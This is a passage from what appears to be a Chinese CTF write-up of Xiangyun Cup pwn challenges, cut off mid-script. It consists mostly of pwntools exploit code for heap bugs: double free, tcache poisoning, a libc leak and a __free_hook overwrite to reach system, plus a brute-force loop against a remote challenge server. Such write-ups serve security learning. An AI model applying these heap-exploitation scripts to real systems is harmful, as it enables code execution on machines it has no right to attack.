number\">9</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x100</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> decode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 8 , 0</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Pwd is: '</span><span class=\"token punctuation\">)</span>\n__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key \nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\n\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\n__free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\nsystem <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">,</span>__free_hook<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">,</span>system<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>system <span class=\"token operator\">^</span> key<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token operator\">^</span>key<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">14</span> <span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   pwdFree.py\n@Time    :   2021/08/21 20:08:21\n@Author  :   Niyah \n'''</span>\n</code></pre>\n<h1 id=\"lemon\"><a class=\"markdownIt-Anchor\" href=\"#lemon\">#</a> Lemon</h1>\n<p>Lemon 这题方法用错了，爆破了挺久的，官方解的话好像两下就出来了</p>\n<p>这里首先绕一下把 flag 存到栈上</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/4.png\" alt=\"1\"></p>\n<p>add 这里有个 double free 但只能申请 0x30 大小的，通过这个可以修改 chunk 头</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/5.png\" alt=\"1\"></p>\n<p>edit 存在堆溢出，可以控制 tcache 管理块从而使用 fastbin，但 edit 只有一次（师傅说这里有个负溢出，看了看确实）</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/6.png\" alt=\"1\"></p>\n<p>本题 onegadget 一个都不能用，调栈帧都不行，只能不断申请 stdout 将栈上的 flag 打印出来</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/7.png\" alt=\"1\"></p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./lemon_pwn'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.26.so'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.104.70.90'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'34524'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exhaust</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">1</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ========> '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index of your lemon: '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Now, name your lemon: '</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'message for you lemon: '</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'your message: '</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">eadd</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">,</span>size <span class=\"token operator\">=</span> <span class=\"token number\">0x600</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index of your lemon: '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Now, name your lemon: '</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'message for you lemon: '</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index of your lemon : '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index of your lemon : '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Input the index of your lemon  : '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'draw and color!'</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'with me?'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'yes'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># dbg()</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'lucky number: '</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x700048</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'tell me you name first:'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'is 0x'</span><span class=\"token punctuation\">)</span>\n\n    stack_low_addr <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack_low_addr'</span><span class=\"token punctuation\">,</span>stack_low_addr<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># sla('with me?','g')</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">)</span>\n    show<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'eat eat eat '</span><span class=\"token punctuation\">)</span>\n    addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x50</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">,</span>addr<span class=\"token punctuation\">)</span>\n\n    fake <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x251</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p16<span class=\"token punctuation\">(</span>addr <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span>fake <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x07'</span><span class=\"token operator\">*</span><span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x01'</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\x07'</span><span class=\"token operator\">*</span><span class=\"token number\">0x3e</span> <span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x07'</span><span class=\"token operator\">*</span><span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    eadd<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x820</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x820</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    low_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x96dd</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">,</span>  <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x98</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> 